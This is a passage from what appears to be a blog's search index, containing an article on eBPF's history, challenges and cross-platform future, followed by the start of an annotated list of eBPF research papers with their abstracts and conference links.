community.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#112-innovative-development-directions-wasm-and-ai","title":"1.1.2 Innovative Development Directions: Wasm and AI","text":"<p>Integrating LLMs with eBPF: Exploring Potential Synergies</p> <p>Combining large language models (LLMs) with eBPF presents a promising technological innovation, especially in the areas of operating system programmability and automation. The powerful natural language processing capabilities of LLMs, when combined with eBPF's kernel-level execution abilities, could offer new methods for system extensions, security enhancements, automated testing, and the generation of complex application logic .</p> <p>Traditionally, writing eBPF programs requires developers to possess deep knowledge of the operating system, presenting a significant barrier for many. Tools like Kgent Kgent and GPTtrace simplify the development process by incorporating LLM technology, allowing more developers to access and utilize eBPF technology. These tools eliminate the complexity of programming and significantly lower the learning curve by translating natural language prompts directly into eBPF code. This innovation enables system administrators and DevOps engineers to easily create and manage kernel extension programs, while also providing students and beginners with a straightforward entry point into eBPF programming.</p> <p>Moreover, LLMs can be employed to create automated testing and feedback mechanisms to verify the correctness of eBPF programs. Through continuous feedback loops, LLMs can optimize the generated code, ensuring it aligns with expected system behavior. This approach not only enhances the security of eBPF programs but also accelerates the development and debugging process.</p> <p>The integration of LLMs with eBPF can also greatly improve system observability and troubleshooting efficiency. eBPF allows developers to dynamically load programs to monitor system behavior, while LLMs can interpret this data and provide intelligent analysis and recommendations. For example, in distributed systems, eBPF can capture system calls or network events, and LLMs can help interpret this data, identify potential system issues, and automatically generate repair suggestions.</p> <p>Combining WebAssembly (Wasm) with eBPF: The New Trend in the Cloud-Native Era</p> <p>In today's cloud-native environment, WebAssembly (Wasm) and eBPF are rapidly emerging as leading lightweight virtual machine tools. Initially developed as a secure sandbox within browsers, Wasm has evolved into a high-performance, cross-platform, multi-language execution environment widely used in server-side, edge computing, and other areas . Meanwhile, eBPF, originally a powerful tool within the Linux kernel for network packet filtering, has become a versatile programmable engine within the kernel space. The convergence of these two technologies is setting new trends in cloud-native technology.</p> <p>Wasm-bpf is an open-source project designed to combine the flexibility of WebAssembly with the kernel programmability of eBPF. By defining a series of abstract eBPF system interfaces, Wasm-bpf provides a unified Wasm + eBPF runtime platform for eBPF programs. Developers can use Wasm-bpf to run eBPF applications in any Wasm virtual machine or lightweight container, seamlessly accessing both kernel and user-space data. This integration not only expands WebAssembly's application scenarios but also enhances eBPF's role in network security, observability, and other fields.</p> <p>Looking ahead, the combination of Wasm and eBPF holds great potential in the data plane of service meshes. Currently, the commonly used sidecar proxy model in service mesh architectures presents performance bottlenecks. Replacing traditional sidecar proxies with eBPF can significantly improve performance. However, eBPF's limitations (such as Turing incompleteness) mean it might not fully meet the demands of complex applications on its own. This is where Wasm provides a new solution. Developers can write application logic in user space, compile it into Wasm modules, and execute them in high-performance Wasm runtimes, closely integrated with eBPF. For instance, the Envoy Proxy project has adopted Wasm as an extension mechanism for the data plane, allowing developers to write proxy logic in multiple languages and execute it through Wasm, enabling efficient and secure application extensions.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#22-challenges-and-bottlenecks-faced-by-ebpf","title":"2.2 Challenges and Bottlenecks Faced by eBPF","text":"<p>Although eBPF (Extended Berkeley Packet Filter) is a transformative technology with strong capabilities in enhancing operating system observability, network performance, and security, it also faces several challenges and bottlenecks as it evolves. These issues not only impact the adoption and widespread use of eBPF but also introduce new complexities and risks for developers and operations personnel. Let's delve into these challenges and explore potential solutions.</p> <p>eBPF's Programming Limitations</p> <p>eBPF was originally designed to address specific network and security issues, and its execution environment is tightly restricted to ensure program safety and controllability. However, this non-Turing complete environment also brings limitations. eBPF uses a subset of the C language and operates under a strict execution model. This means that when developers write complex logic, they must consider various constraints, such as limited stack space, limited loop iterations, and strict memory access boundaries. These constraints prevent malicious code from damaging the kernel but also make development more challenging  .</p> <p>For instance, when implementing complex data structures or algorithms, developers must find alternative solutions or remodel the problem to fit eBPF's constraints. Additionally, eBPF's programming model, with its memory access and computational resource limitations, forces some tasks that could have been completed in user space to be simplified or implemented through multiple kernel-to-user space interactions. This not only increases program complexity but can also negatively impact system performance. Therefore, how to enhance eBPF's programming capabilities without sacrificing security remains a critical area for ongoing research and exploration.</p> <p>To address these complexities, the eBPF community and developers have been working to improve existing tools and frameworks. Tools like bpftrace and bcc have greatly simplified the process of writing and debugging eBPF programs. Additionally, the introduction of LLMs (large language models) offers new approaches. LLMs enable developers to write eBPF code more naturally or even directly translate natural language descriptions into eBPF programs, reducing the programming barrier. However, simplifying the development process of eBPF without sacrificing functionality remains a challenge that needs to be addressed  .</p> <p>Kernel and Application Scenario Complexity</p> <p>The powerful functionality of eBPF requires developers to have a deep understanding of kernel operations, making its learning and application threshold quite high. Developing and debugging eBPF programs requires a deep understanding of the Linux kernel's working mechanisms, including kernel module principles, system call implementations, and memory management techniques. For most developers, acquiring this knowledge requires not only high skill but also continuous experience accumulation through practice. This results in a steep learning curve for eBPF, limiting its spread and application among a broader developer community.</p> <p>Moreover, different Linux distributions and kernel versions vary in their support for eBPF, posing cross-platform compatibility challenges for developers. Some kernel versions may lack support for specific eBPF features, or eBPF programs may behave differently under different kernel configurations. To ensure that eBPF programs run stably across various environments, developers must conduct extensive testing and adjustments. This not only increases development costs but also extends the time-to-market for products.</p> <p>As eBPF's application scenarios expand, its complexity also increases. This not only raises the skill requirements for developers but also complicates the debugging and optimization of eBPF programs. To mitigate these complexities, future research and development efforts could focus on creating smarter IDEs and debugging tools. These tools should be capable of automatically identifying and fixing common programming errors, providing optimization suggestions to developers, and reducing the difficulty of eBPF program development. These advancements will enable more developers to utilize eBPF technology, improving its application efficiency and effectiveness in real production environments.</p> <p>eBPF's Security</p> <p>The kernel-level execution of eBPF introduces significant security risks. If eBPF programs are maliciously exploited, they could lead to kernel crashes or sensitive data leaks. To address this, the Linux kernel includes an eBPF verifier, which performs strict static analysis and checks when loading eBPF programs, ensuring they do not violate memory access boundaries or execute illegal operations.</p> <p>While the verifier effectively prevents the execution of malicious code in most cases, recent research and real-world incidents have shown that the verifier is not infallible. Sophisticated attack techniques can sometimes bypass the verifier\u2019s checks, exploiting kernel vulnerabilities to perform unauthorized operations. This indicates that the current eBPF security model still has room for improvement. Researchers have proposed various solutions to enhance eBPF's security, such as introducing hardware-based isolation techniques (e.g., Intel's Memory Protection Keys) or using software methods (e.g., SandBPF) to further isolate eBPF program execution. Although these solutions theoretically improve eBPF's security, they face numerous practical challenges, such as hardware support availability and software isolation performance overheads.</p> <p>Moreover, as the application scope of eBPF broadens, so do the security challenges it faces. Enhancing eBPF program security while maintaining high performance remains a crucial area for future development.</p> <p>Performance Trade-offs and Tool Coexistence</p> <p>One of eBPF's primary advantages is its high performance, particularly in network packet processing and real-time system monitoring. However, as eBPF's functionality expands, its performance faces new challenges. Specifically, eBPF was initially optimized for specific tasks, such as network traffic filtering or system event tracing, but when applied to broader scenarios, performance bottlenecks can arise. For instance, when multiple eBPF programs run concurrently, system resource contention may lead to overall performance degradation. In such cases, developers need to balance functionality and performance to ensure that eBPF programs meet requirements without overburdening the system.</p> <p>Another significant issue is the fragmentation of the eBPF toolchain. Currently, the development and deployment tools surrounding eBPF are becoming increasingly diverse, which, while expanding developers' options, also introduces compatibility and interoperability challenges. Different tools may have inconsistent interfaces and behaviors, complicating the management and integration of eBPF programs in complex systems. Furthermore, the fragmentation of the toolchain can hinder the rapid promotion of technical achievements to production environments, limiting the widespread adoption of eBPF technology.</p> <p>To address these issues, the community is promoting the standardization of the eBPF toolchain and developing more unified and user-friendly frameworks to help developers better manage the development, testing, and deployment of eBPF programs. In the future, by integrating the toolchain and optimizing performance, eBPF will be able to play its intended role in more scenarios.</p> <p>The Need for Standardization</p> <p>As eBPF is increasingly applied to different platforms, such as Windows and macOS, the need for standardization becomes more critical. Without unified standards, compatibility issues may arise, increasing the burden on developers. To address this, the eBPF community and related industry organizations should expedite the standardization process by establishing unified APIs and programming specifications to ensure consistency and compatibility of eBPF programs across different platforms. This approach will not only improve development efficiency but also promote the widespread application of eBPF technology.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#31-future-trends-in-ebpf-development","title":"3.1 Future Trends in eBPF Development","text":"<p>eBPF (Extended Berkeley Packet Filter) was initially developed on the Linux platform and has gradually expanded to other operating systems like Windows and macOS as its powerful capabilities have been recognized. In the future, eBPF is expected to become a cross-platform infrastructure technology. By providing a unified programming interface, eBPF allows developers to run the same code seamlessly across multiple platforms, enhancing development efficiency and supporting interoperability and consistency across multi-platform systems. As eBPF becomes more widespread on other operating systems, it is poised to become a standard component of modern operating system ecosystems, offering a unified solution for network monitoring, security, and system observability across different environments.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#32-ebpf-for-windows","title":"3.2 eBPF for Windows","text":"<p>eBPF for Windows is a project initiated by Microsoft aimed at bringing the powerful capabilities of eBPF (Extended Berkeley Packet Filter) from Linux to the Windows system. Originally developed for the Linux kernel to enhance system observability, network monitoring, and security, this project allows developers to run eBPF programs in Windows environments, offering similar functionalities as on Linux without modifying core kernel code.</p> <p>The eBPF for Windows project integrates many common eBPF toolchains and APIs from the Linux platform, making it easier for developers familiar with the Linux ecosystem to develop on Windows. This project supports various eBPF hooks and helpers, and it can perform Just-In-Time (JIT) compilation, converting eBPF bytecode into native Windows kernel instructions for efficient execution, akin to the performance of native kernel code.</p> <p>A key advancement of eBPF for Windows is the introduction of diagnostic tools and secure deployment pipelines. The project is integrated with the Windows Driver Kit (WDK), allowing eBPF programs to be compiled into Windows driver binary files, ensuring these programs can be securely signed and deployed in production systems. This process includes rigorous verification steps to ensure the security and correctness of eBPF programs, mitigating potential security risks.</p> <p>Overall, eBPF for Windows represents a significant step toward making eBPF a cross-platform technology, enabling developers to use the same powerful tools to enhance system observability and security in both Linux and Windows environments.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#33-user-space-ebpf-runtime-bpftime","title":"3.3 User-Space eBPF Runtime: bpftime","text":"<p>bpftime is a user-space eBPF runtime designed to overcome some of the limitations of kernel-space eBPF and fully exploit the potential of eBPF in user space. Originally designed as a tool for network packet filtering, eBPF has now become a powerful system-level extension technology widely used in performance analysis, security policies, and other fields. While eBPF has strong capabilities in kernel space, it encounters bottlenecks in certain application scenarios due to security, scalability, and performance limitations. bpftime aims to address these challenges by providing a more flexible and efficient solution by introducing eBPF into user space.</p> <p>A key feature of bpftime is its compatibility with existing eBPF tools and ecosystems. By being compatible with tools like bpftrace and BCC/libbpf-tools, bpftime allows users to execute unmodified eBPF scripts in user space for system call or user-space function tracing. This design not only facilitates the migration of existing eBPF users to user space but also provides developers with a debugging environment that does not require kernel modifications or kernel eBPF support.</p> <p>In terms of performance, bpftime offers efficient Uprobe and system call tracing capabilities. Traditional Uprobe involves multiple context switches between kernel space and user space, often resulting in significant performance overhead. bpftime avoids these overheads by embedding eBPF programs into the traced process's function call context through binary rewriting. This allows for dynamic tracing and extension, enabling features such as modifying function return values, code extension, hot patching, and fault injection. Compared to kernel Uprobe, bpftime's Uprobe implementation is significantly more performant, making it suitable for high-performance applications.</p> <p>Additionally, bpftime features a built-in LLVM-based JIT compiler and AOT compiler, further improving the execution efficiency of eBPF programs. Compared to other user-space eBPF runtimes, bpftime's JIT compiler offers near-native code execution efficiency and better cross-platform support. The AOT compiler allows pre-compiling eBPF bytecode into machine code files for specific architectures, making it particularly useful for deployment on embedded devices and significantly reducing compilation startup time.</p> <p>Beyond these features, bpftime demonstrates potential in various exploratory application scenarios. For example, bpftime can enable user-space fault injection, eBPF-based Nginx module extensions, and enhanced Fuse file system capabilities. Especially in modern eBPF observability tools, bpftime can achieve cross-boundary analysis between kernel space and user space, providing a more comprehensive perspective for system performance tuning and fault diagnosis.</p> <p>As an exploratory project still under development, bpftime represents an important direction for user-space eBPF. In the future, it is expected to further expand in kernel compatibility, performance optimization, and additional application scenarios, offering new possibilities for the application of eBPF in modern computing.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#34-ebpfs-standardization-and-emerging-application-fields","title":"3.4 eBPF's Standardization and Emerging Application Fields","text":""},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#ebpf-as-a-potential-cross-platform-standardization-layer","title":"eBPF as a Potential Cross-Platform Standardization Layer","text":"<p>As eBPF's application continues to expand across different operating systems, it is gradually evolving from a Linux-exclusive technology into a cross-platform infrastructure technology. Beyond its deep integration within the Linux kernel, eBPF is beginning to take root on Windows and is expected to extend to other operating systems like macOS and FreeBSD. This cross-platform expansion of eBPF paves the way for it to become a standardized layer across various operating systems. In the future, eBPF is likely to become an indispensable component of operating systems, providing developers with a consistent programming interface and execution environment, simplifying cross-platform development complexity.</p> <p>This trend toward standardization offers numerous potential benefits. First, cross-platform eBPF enables developers to write code once and seamlessly execute it across multiple operating systems, significantly improving development efficiency and software portability. Second, as more operating systems adopt eBPF, the industry's toolchains, frameworks, and libraries will also become more unified, further reducing developers' cognitive load when switching between platforms. Moreover, the standardization of eBPF can foster industry collaboration, encouraging developers and vendors across different operating systems to jointly drive the development and optimization of eBPF, invigorating the entire ecosystem.</p> <p>For instance, the standardization of eBPF may play a crucial role in future cloud computing and edge computing environments. As enterprises increasingly adopt hybrid and multi-cloud architectures, a cross-platform standardized layer could enable eBPF to act as a bridge connecting different cloud environments and edge devices, offering unified monitoring, security, and network management solutions for these dispersed computing resources. In this way, eBPF helps to simplify complex IT infrastructure while enhancing its overall security and performance.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#emerging-application-fields-driving-cloud-native-architecture-development","title":"Emerging Application Fields: Driving Cloud-Native Architecture Development","text":"<p>As eBPF's capabilities expand, its application in cloud-native infrastructure is becoming increasingly prevalent. eBPF offers powerful tools for performance monitoring, security policy enforcement, and network optimization, which are critical components of modern cloud-native architectures. Specifically, eBPF enables real-time system data capture, deep analysis, and automatic system performance optimization based on this data, making it an ideal tool for cloud-native environments.</p> <p>A typical use case is eBPF's network optimization within containerized environments. Container orchestration platforms like Kubernetes demand high network performance, particularly in large-scale deployments. Traditional methods for network monitoring and optimization typically involve multiple layers of proxies and middleware, leading to unnecessary latency and complexity. In contrast, eBPF can implement network traffic monitoring and optimization directly within the kernel, avoiding additional performance overhead while providing finer control. This capability makes eBPF a key technology for improving container network performance and drives further development of cloud-native infrastructure, such as service meshes.</p> <p>Additionally, eBPF's application in security is expanding. In cloud-native environments, security threats are omnipresent, and effective system protection is a priority for enterprises. eBPF provides a built-in kernel security mechanism, allowing systems to monitor and respond to potential threats in real time. For example, eBPF can trigger security policies immediately upon detecting suspicious behavior, preventing further spread of attacks. By integrating with existing security frameworks, eBPF not only enhances system security but also provides more efficient threat detection and response mechanisms.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#4-conclusion-and-outlook","title":"4. Conclusion and Outlook","text":"<p>Since its inception, eBPF has evolved from a simple network packet filtering tool into a powerful technology widely applied in operating system kernel extensions, performance optimization, and security monitoring. Its rise reflects not only technological advancements but also the ongoing evolution of modern computing needs. Although eBPF has already demonstrated significant advantages in various fields, its future development will continue to be marked by challenges and opportunities.</p> <p>eBPF's influence is still expanding. It has firmly established itself within the Linux kernel and is gradually being ported to Windows, other operating systems, and user-space extensions. This cross-platform expansion will further solidify eBPF's position within operating systems, making it an essential component of future system architectures. As more developers and enterprises recognize eBPF's potential, it is set to become a standard component in the next generation of operating systems and cloud computing environments, offering strong support for the entire IT ecosystem.</p> <p>The standardization and widespread adoption of eBPF will be important trends moving forward. As eBPF's application expands across various operating systems, the need for standardization becomes increasingly important. A unified API and programming model will greatly simplify cross-platform development, improving software portability and compatibility. This approach will not only promote the global adoption of eBPF technology but also accelerate the maturation of related toolchains and ecosystems, fostering industry collaboration and innovation.</p> <p>eBPF's role in cloud-native infrastructure will continue to grow. As cloud computing and containerization technologies advance rapidly, enterprises face increasing demands for system observability, security, and performance optimization. eBPF provides an efficient and flexible solution, enabling developers to monitor system behavior in real-time, automatically adjust system performance, and enhance security at the kernel level. In the future, eBPF will continue to play a key role in these critical areas, helping enterprises tackle complex computing challenges and driving the growth of the digital and cloud-native world.</p> <p>Ultimately, eBPF will become the \"invisible force\" within modern operating systems, quietly powering countless devices and systems, and driving the global digital infrastructure. Whether in servers, edge computing, or embedded devices, eBPF will provide developers and operations personnel with powerful and flexible tools, helping them better manage and optimize system performance while ensuring security and stability. As technology continues to advance, eBPF's potential will be further unleashed, injecting new momentum into the next wave of innovation.</p> <p>Share on  Share on </p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/","title":"The Evolution and Impact of eBPF: A list of Key Research Papers from Recent Years","text":"<p>This is a list of eBPF related papers I read in recent years, might be helpful for people who are interested in eBPF related research.</p> <p>eBPF (extended Berkeley Packet Filter) is an emerging technology that allows safe execution of user-provided programs in the Linux kernel. It has gained widespread adoption in recent years for accelerating network processing, enhancing observability, and enabling programmable packet processing.</p> <p>This document list some key research papers on eBPF over the past few years. The papers cover several aspects of eBPF, including accelerating distributed systems, storage, and networking, formally verifying the eBPF JIT compiler and verifier, applying eBPF for intrusion detection, and automatically generating hardware designs from eBPF programs.</p> <p>Some key highlights:</p> <ul> <li>eBPF enables executing custom functions in the kernel to accelerate distributed protocols, storage engines, and networking applications with improved throughput and lower latency compared to traditional userspace implementations.</li> <li>Formal verification of eBPF components like JIT and verifier ensures correctness and reveals bugs in real-world implementations.</li> <li>eBPF's programmability and efficiency make it suitable for building intrusion detection and network monitoring applications entirely in the kernel.</li> <li>Automated synthesis of hardware designs from eBPF programs allows software developers to quickly generate optimized packet processing pipelines in network cards.</li> </ul> <p>The papers demonstrate eBPF's versatility in accelerating systems, enhancing security, and simplifying network programming. As eBPF adoption grows, it is an important area of systems research with many open problems related to performance, safety, hardware integration, and ease of use.</p> <p>If you have any suggestions or adding papers, please feel free to open an issue or PR. The list was created in 2023.10, New papers will be added in the future.</p> <p>Check out our open-source projects at eunomia-bpf and eBPF tutorials at bpf-developer-tutorial. I'm also looking for a PhD position in the area of systems and networking in 2024/2025. My Github and email.</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#xrp-in-kernel-storage-functions-with-ebpf","title":"XRP: In-Kernel Storage Functions with eBPF","text":"<p>With the emergence of microsecond-scale NVMe storage devices, the Linux kernel storage stack overhead has become significant, almost doubling access times. We present XRP, a framework that allows applications to execute user-defined storage functions, such as index lookups or aggregations, from an eBPF hook in the NVMe driver, safely bypassing most of the kernel\u2019s storage stack. To preserve file system semantics, XRP propagates a small amount of kernel state to its NVMe driver hook where the user-registered eBPF functions are called. We show how two key-value stores, BPF-KV, a simple B+-tree key-value store, and WiredTiger, a popular log-structured merge tree storage engine, can leverage XRP to significantly improve throughput and latency.</p> <p>OSDI '22 Best Paper: https://www.usenix.org/conference/osdi22/presentation/zhong</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#specification-and-verification-in-the-field-applying-formal-methods-to-bpf-just-in-time-compilers-in-the-linux-kernel","title":"Specification and verification in the field: Applying formal methods to BPF just-in-time compilers in the Linux kernel","text":"<p>This paper describes our experience applying formal methods to a critical component in the Linux kernel, the just-in-time compilers (\"JITs\") for the Berkeley Packet Filter (BPF) virtual machine. We verify these JITs using Jitterbug, the first framework to provide a precise specification of JIT correctness that is capable of ruling out real-world bugs, and an automated proof strategy that scales to practical implementations. Using Jitterbug, we have designed, implemented, and verified a new BPF JIT for 32-bit RISC-V, found and fixed 16 previously unknown bugs in five other deployed JITs, and developed new JIT optimizations; all of these changes have been upstreamed to the Linux kernel. The results show that it is possible to build a verified component within a large, unverified system with careful design of specification and proof strategy.</p> <p>OSDI 20: https://www.usenix.org/conference/osdi20/presentation/nelson</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#-io-a-unified-io-stack-for-computational-storage","title":"\u03bb-IO: A Unified IO Stack for Computational Storage","text":"<p>The emerging computational storage device offers an opportunity for in-storage computing. It alleviates the overhead of data movement between the host and the device, and thus accelerates data-intensive applications. In this paper, we present \u03bb-IO, a unified IO stack managing both computation and storage resources across the host and the device. We propose a set of designs \u2013 interface, runtime, and scheduling \u2013 to tackle three critical issues. We implement \u03bb-IO in full-stack software and hardware environment, and evaluate it with synthetic and real applications against Linux IO, showing up to 5.12\u00d7 performance improvement.</p> <p>FAST23: https://www.usenix.org/conference/fast23/presentation/yang-zhe</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#extension-framework-for-file-systems-in-user-space","title":"Extension Framework for File Systems in User space","text":"<p>User file systems offer numerous advantages over their in-kernel implementations, such as ease of development and better system reliability. However, they incur heavy performance penalty. We observe that existing user file system frameworks are highly general; they consist of a minimal interposition layer in the kernel that simply forwards all low-level requests to user space. While this design offers flexibility, it also severely degrades performance due to frequent kernel-user context switching.</p> <p>This work introduces ExtFUSE, a framework for developing extensible user file systems that also allows applications to register \"thin\" specialized request handlers in the kernel to meet their specific operative needs, while retaining the complex functionality in user space. Our evaluation with two FUSE file systems shows that ExtFUSE can improve the performance of user file systems with less than a few hundred lines on average. ExtFUSE is available on GitHub.</p> <p>ATC 19: https://www.usenix.org/conference/atc19/presentation/bijlani</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#electrode-accelerating-distributed-protocols-with-ebpf","title":"Electrode: Accelerating Distributed Protocols with eBPF","text":"<p>Implementing distributed protocols under a standard Linux kernel networking stack enjoys the benefits of load-aware CPU scaling, high compatibility, and robust security and isolation. However, it suffers from low performance because of excessive user-kernel crossings and kernel networking stack traversing. We present Electrode with a set of eBPF-based performance optimizations designed for distributed protocols. These optimizations get executed in the kernel before the networking stack but achieve similar functionalities as were implemented in user space (e.g., message broadcasting, collecting quorum of acknowledgments), thus avoiding the overheads incurred by user-kernel crossings and kernel networking stack traversing. We show that when applied to a classic Multi-Paxos state machine replication protocol, Electrode improves its throughput by up to 128.4% and latency by up to 41.7%.</p> <p>NSDI 23: https://www.usenix.org/conference/nsdi23/presentation/zhou</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#bmc-accelerating-memcached-using-safe-in-kernel-caching-and-pre-stack-processing","title":"BMC: Accelerating Memcached using Safe In-kernel Caching and Pre-stack Processing","text":"<p>In-memory key-value stores are critical components that help scale large internet services by providing low-latency access to popular data. Memcached, one of the most popular key-value stores, suffers from performance limitations inherent to the Linux networking stack and fails to achieve high performance when using high-speed network interfaces. While the Linux network stack can be bypassed using DPDK based solutions, such approaches require a complete redesign of the software stack and induce high CPU utilization even when client load is low.</p> <p>To overcome these limitations, we present BMC, an in-kernel cache for Memcached that serves requests before the execution of the standard network stack. Requests to the BMC cache are treated as part of the NIC interrupts, which allows performance to scale with the number of cores serving the NIC queues. To ensure safety, BMC is implemented using eBPF. Despite the safety constraints of eBPF, we show that it is possible to implement a complex cache service. Because BMC runs on commodity hardware and requires modification of neither the Linux kernel nor the Memcached application, it can be widely deployed on existing systems. BMC optimizes the processing time of Facebook-like small-size requests. On this target workload, our evaluations show that BMC improves throughput by up to 18x compared to the vanilla Memcached application and up to 6x compared to an optimized version of Memcached that uses the SO_REUSEPORT socket flag. In addition, our results also show that BMC has negligible overhead and does not deteriorate throughput when treating non-target workloads.</p> <p>NSDI 21: https://www.usenix.org/conference/nsdi21/presentation/ghigoff</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#hxdp-efficient-software-packet-processing-on-fpga-nics","title":"hXDP: Efficient Software Packet Processing on FPGA NICs","text":"<p>FPGA accelerators on the NIC enable the offloading of expensive packet processing tasks from the CPU. However, FPGAs have limited resources that may need to be shared among diverse applications, and programming them is difficult.</p> <p>We present a solution to run Linux's eXpress Data Path programs written in eBPF on FPGAs, using only a fraction of the available hardware resources while matching the performance of high-end CPUs. The iterative execution model of eBPF is not a good fit for FPGA accelerators. Nonetheless, we show that many of the instructions of an eBPF program can be compressed, parallelized or completely removed, when targeting a purpose-built FPGA executor, thereby significantly improving performance. We leverage that to design hXDP, which includes (i) an optimizing-compiler that parallelizes and translates eBPF bytecode to an extended eBPF Instruction-set Architecture defined by us; a (ii) soft-processor to execute such instructions on FPGA; and (iii) an FPGA-based infrastructure to provide XDP's maps and helper functions as defined within the Linux kernel.</p> <p>We implement hXDP on an FPGA NIC and evaluate it running real-world unmodified eBPF programs. Our implementation is clocked at 156.25MHz, uses about 15% of the FPGA resources, and can run dynamically loaded programs. Despite these modest requirements, it achieves the packet processing throughput of a high-end CPU core and provides a 10x lower packet forwarding latency.</p> <p>OSDI 20: https://www.usenix.org/conference/osdi20/presentation/brunella</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#network-centric-distributed-tracing-with-deepflow-troubleshooting-your-microservices-in-zero-code","title":"Network-Centric Distributed Tracing with DeepFlow: Troubleshooting Your Microservices in Zero Code","text":"<p>Microservices are becoming more complicated, posing new challenges for traditional performance monitoring solutions. On the one hand, the rapid evolution of microservices places a significant burden on the utilization and maintenance of existing distributed tracing frameworks. On the other hand, complex infrastructure increases the probability of network performance problems and creates more blind spots on the network side. In this paper, we present DeepFlow, a network-centric distributed tracing framework for troubleshooting microservices. DeepFlow provides out-of-the-box tracing via a network-centric tracing plane and implicit context propagation. In addition, it eliminates blind spots in network infrastructure, captures network metrics in a low-cost way, and enhances correlation between different components and layers. We demonstrate analytically and empirically that DeepFlow is capable of locating microservice performance anomalies with negligible overhead. DeepFlow has already identified over 71 critical performance anomalies for more than 26 companies and has been utilized by hundreds of individual developers. Our production evaluations demonstrate that DeepFlow is able to save users hours of instrumentation efforts and reduce troubleshooting time from several hours to just a few minutes.</p> <p>SIGCOMM 23: https://dl.acm.org/doi/10.1145/3603269.3604823</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#fast-in-kernel-traffic-sketching-in-ebpf","title":"Fast In-kernel Traffic Sketching in eBPF","text":"<p>The extended Berkeley Packet Filter (eBPF) is an infrastructure that allows to dynamically load and run micro-programs directly in the Linux kernel without recompiling it.</p> <p>In this work, we study how to develop high-performance network measurements in eBPF. We take sketches as case-study, given their ability to support a wide-range of tasks while providing low-memory footprint and accuracy guarantees. We implemented NitroSketch, the state-of-the-art sketch for user-space networking and show that best practices in user-space networking cannot be directly applied to eBPF, because of its different performance characteristics. By applying our lesson learned we improve its performance by 40% compared to a naive implementation.</p> <p>SIGCOMM 23: https://dl.acm.org/doi/abs/10.1145/3594255.3594256</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#spright-extracting-the-server-from-serverless-computing-high-performance-ebpf-based-event-driven-shared-memory-processing","title":"SPRIGHT: extracting the server from serverless computing! high-performance eBPF-based event-driven, shared-memory processing","text":"<p>Serverless computing promises an efficient, low-cost compute capability in cloud environments. However, existing solutions, epitomized by open-source platforms such as Knative, include heavyweight components that undermine this goal of serverless computing. Additionally, such serverless platforms lack dataplane optimizations to achieve efficient, high-performance function chains that facilitate the popular microservices development paradigm. Their use of unnecessarily complex and duplicate capabilities for building function chains severely degrades performance. 'Cold-start' latency is another deterrent.</p> <p>We describe SPRIGHT, a lightweight, high-performance, responsive serverless framework. SPRIGHT exploits shared memory processing and dramatically improves the scalability of the dataplane by avoiding unnecessary protocol processing and serialization-deserialization overheads. SPRIGHT extensively leverages event-driven processing with the extended Berkeley Packet Filter (eBPF). We creatively use eBPF's socket message mechanism to support shared memory processing, with overheads being strictly load-proportional. Compared to constantly-running, polling-based DPDK, SPRIGHT achieves the same dataplane performance with 10\u00d7 less CPU usage under realistic workloads. Additionally, eBPF benefits SPRIGHT, by replacing heavyweight serverless components, allowing us to keep functions 'warm' with negligible penalty.</p> <p>Our preliminary experimental results show that SPRIGHT achieves an order of magnitude improvement in throughput and latency compared to Knative, while substantially reducing CPU usage, and obviates the need for 'cold-start'.</p> <p>https://dl.acm.org/doi/10.1145/3544216.3544259</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#bpftime-userspace-ebpf-runtime-for-uprobe-syscall-and-kernel-user-interactions","title":"bpftime: userspace eBPF Runtime for Uprobe, Syscall and Kernel-User Interactions","text":"<p>In kernel-centric operations, the uprobe component of eBPF frequently encounters performance bottlenecks, largely attributed to the overheads borne by context switches. Transitioning eBPF operations to user space bypasses these hindrances, thereby optimizing performance. This also enhances configurability and obviates the necessity for root access or privileges for kernel eBPF, subsequently minimizing the kernel attack surface. This paper introduces bpftime, a novel user-space eBPF runtime, which leverages binary rewriting to implement uprobe and syscall hook capabilities. Through bpftime, userspace uprobes achieve a 10x speed enhancement compared to their kernel counterparts without requiring dual context switches. Additionally, this runtime facilitates the programmatic hooking of syscalls within a process, both safely and efficiently. Bpftime can be seamlessly attached to any running process, limiting the need for either a restart or manual recompilation. Our implementation also extends to interprocess eBPF Maps within shared memory, catering to summary aggregation or control plane communication requirements. Compatibility with existing eBPF toolchains such as clang and libbpf is maintained, not only simplifying the development of user-space eBPF without necessitating any modifications but also supporting CO-RE through BTF. Through bpftime, we not only enhance uprobe performance but also extend the versatility and user-friendliness of 